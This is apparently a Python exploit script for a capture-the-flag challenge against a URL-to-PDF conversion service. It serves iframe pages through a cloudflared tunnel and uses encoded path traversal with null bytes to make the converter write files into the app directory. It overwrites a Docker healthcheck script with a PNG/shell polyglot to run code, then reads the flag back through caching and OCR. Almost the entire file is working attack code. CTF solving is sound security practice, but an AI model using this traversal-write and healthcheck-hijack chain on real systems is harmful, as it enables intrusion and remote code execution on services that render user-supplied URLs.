import http.server, threading, subprocess, re, time, os, ssl, urllib.request, urllib.parse, urllib.error, pathlib
TARGET=os.environ['TARGET'].rstrip('/')
SOURCE=pathlib.Path('/tmp/source.png').read_bytes(); PORT=8765; ORIGIN=''
FLAG=re.compile(rb'kaspersky\{[^}\r\n]{1,240}\}',re.I)
P1='/%2e%2e/%2e%2e/%2e%2e/app/tools/index.html%00x'
P2='/%2e%2e/%2e%2e/%2e%2e/app/healthcheck.sh%00x'
resource_hits=0

class H(http.server.BaseHTTPRequestHandler):
  def log_message(self,fmt,*args): print('HTTPLOG',fmt%args,flush=True)
  def sendb(self,ct,b,code=200,extra=None):
    self.send_response(code)
    if ct: self.send_header('Content-Type',ct)
    if b is not None: self.send_header('Content-Length',str(len(b)))
    self.send_header('Cache-Control','no-store')
    if extra:
      for k,v in extra.items(): self.send_header(k,v)
    self.end_headers()
    if b: self.wfile.write(b)
  def do_GET(self):
    global ORIGIN,resource_hits
    p=urllib.parse.urlsplit(self.path).path
    print('GETPATH',repr(self.path),flush=True)
    if p=='/source.png': return self.sendb('image/png',SOURCE,extra={'ETag':'"dfo-source-v1"'})
    if p=='/stage1':
      src=ORIGIN+P1
      b=(f'<!doctype html><style>html,body{{margin:0}}iframe{{display:block;border:0;width:686px;height:175px}}</style><iframe width=686 height=175 src="{src}"></iframe>').encode()
      return self.sendb('text/html; charset=utf-8',b)
    if p=='/stage2':
      src=ORIGIN+P2
      b=(f'<!doctype html><style>html,body{{margin:0}}iframe{{display:block;border:0;width:686px;height:175px}}</style><iframe width=686 height=175 src="{src}"></iframe>').encode()
      return self.sendb('text/html; charset=utf-8',b)
    if p=='/stage3':
      src=ORIGIN+P1
      b=(f'<!doctype html><style>html,body{{margin:0;overflow:hidden}} iframe{{display:block;border:0;width:686px;height:175px;transform:scale(3);transform-origin:0 0}}</style><iframe width=686 height=175 src="{src}"></iframe>').encode()
      return self.sendb('text/html; charset=utf-8',b)
    # Traversal resource itself. First fetch must provide the 686x175 source bitmap.
    # Any later revalidation gets 304, preserving the file that the healthcheck overwrote.
    resource_hits += 1
    print('RESOURCE_HIT',resource_hits,repr(self.path),flush=True)
    if resource_hits >= 2:
      self.send_response(304); self.send_header('ETag','"sink-v1"'); self.end_headers(); return
    b=(b'<!doctype html><style>html,body{margin:0;padding:0;width:686px;height:175px;overflow:hidden}'
       b'img{display:block;margin:0;padding:0;width:686px;height:175px}</style>'
       b'<img width=686 height=175 src="/source.png">')
    return self.sendb('text/html; charset=utf-8',b,extra={'ETag':'"sink-v1"'})

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(url,timeout=30):
  with opener.open(urllib.request.Request(url,headers={'User-Agent':'DFO-CTF'}),timeout=timeout) as r: return r.status,dict(r.headers),r.read()
def convert(url,n):
  data=urllib.parse.urlencode({'url':url}).encode(); req=urllib.request.Request(TARGET+'/convert',data=data,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'DFO-CTF'})
  try:
    with opener.open(req,timeout=60) as r: body=r.read(); st=r.status; hdr=dict(r.headers)
  except urllib.error.HTTPError as e: body=e.read(); st=e.code; hdr=dict(e.headers)
  pathlib.Path(f'/tmp/gen{n}.bin').write_bytes(body)
  print(f'GEN{n} status={st} bytes={len(body)} ct={hdr.get("Content-Type","")}',flush=True)
  m=FLAG.search(body)
  if m: return m.group().decode('ascii','replace')
  if body.startswith(b'%PDF'):
    pdf=f'/tmp/gen{n}.pdf'; pathlib.Path(pdf).write_bytes(body)
    # Text extractor first, then raster OCR because iframe content is normally rasterized.
    try:
      txt=subprocess.check_output(['pdftotext',pdf,'-'],stderr=subprocess.STDOUT,timeout=10)
      print('PDFTEXT',n,repr(txt[:800]),flush=True)
      m=FLAG.search(txt)
      if m: return m.group().decode('ascii','replace')
    except Exception as e: print('PDFTEXT_ERR',repr(e),flush=True)
    if n>=3:
      subprocess.run(['pdftoppm','-f','1','-singlefile','-r','600','-png',pdf,f'/tmp/page{n}'],check=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
      img=f'/tmp/page{n}.png'
      for psm in ('6','11','3'):
        try:
          o=subprocess.check_output(['tesseract',img,'stdout','--psm',psm],stderr=subprocess.DEVNULL,timeout=20)
          print('OCR',psm,repr(o[:1600]),flush=True)
          m=FLAG.search(o)
          if m: return m.group().decode('ascii','replace')
        except Exception as e: print('OCR_ERR',psm,repr(e),flush=True)
  else: print('BODY',n,repr(body[:1000]),flush=True)
  return None

srv=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
cf=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
deadline=time.time()+45
while time.time()<deadline:
  line=cf.stdout.readline()
  if line:
    print('CF',line.rstrip(),flush=True); m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',line,re.I)
    if m: ORIGIN=m.group(); break
  elif cf.poll() is not None: break
if not ORIGIN: raise SystemExit('NO_TUNNEL')
print('ORIGIN='+ORIGIN,flush=True)
for attempt in range(20):
  try:
    st,h,b=get(ORIGIN+'/source.png',10); print('TUNNEL_SOURCE',st,len(b),'attempt',attempt+1,flush=True)
    if b!=SOURCE: raise RuntimeError('source mismatch')
    break
  except Exception as e: print('TUNNEL_RETRY',attempt+1,repr(e),flush=True); time.sleep(2)
else: raise SystemExit('TUNNEL_UNREADY')

st,h,b=get(TARGET+'/'); print('TARGET_ROOT',st,len(b),repr(b[:250]),flush=True)
m=FLAG.search(b)
if m: print('FLAG='+m.group().decode(),flush=True); raise SystemExit(0)

# 1: create /app/tools/index.html, needed for the fixed t*/i* shell glob.
f=convert(ORIGIN+'/stage1?outer='+str(time.time_ns()),1)
if f: print('FLAG='+f,flush=True); raise SystemExit(0)
time.sleep(2)
# 2: overwrite /app/healthcheck.sh with the already verified PNG/dash polyglot.
f=convert(ORIGIN+'/stage2?outer='+str(time.time_ns()),2)
if f: print('FLAG='+f,flush=True); raise SystemExit(0)
print('WRITES_DONE resource_hits=',resource_hits,'waiting for Docker healthcheck',flush=True)
# next Docker healthcheck should occur within 30 s; allow margin.
time.sleep(42)
# 3: same inner P1 URL. Cache hit/revalidation should preserve and render the now-text flag file.
f=convert(ORIGIN+'/stage3?outer='+str(time.time_ns()),3)
print('AFTER_READ resource_hits=',resource_hits,flush=True)
if f:
  print('FLAG='+f,flush=True); pathlib.Path('/tmp/FLAG.txt').write_text(f+'\n'); raise SystemExit(0)
# Also check if a lucky alternate traversal wrote directly to root template.
st,h,b=get(TARGET+'/'); print('ROOT_AFTER',st,len(b),repr(b[:1200]),flush=True)
m=FLAG.search(b)
if m: print('FLAG='+m.group().decode(),flush=True); raise SystemExit(0)
raise SystemExit('FLAG_NOT_FOUND')